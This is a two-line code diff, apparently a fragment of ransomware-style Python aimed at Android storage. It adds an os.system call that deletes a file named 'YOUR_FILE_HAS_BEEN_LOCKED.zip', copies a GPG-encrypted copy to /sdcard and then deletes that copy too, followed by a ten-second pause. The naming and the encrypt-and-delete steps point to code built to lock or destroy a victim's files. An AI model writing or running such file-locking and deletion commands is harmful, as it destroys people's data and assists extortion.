@@ -1,0 +1,2 @@
+os.system('rm YOUR_FILE_HAS_BEEN_LOCKED.zip;cp YOUR_FILE_HAS_BEEN_LOCKED.zip.gpg /sdcard;rm YOUR_FILE_HAS_BEEN_LOCKED.zip.gpg')
+time.sleep(10)
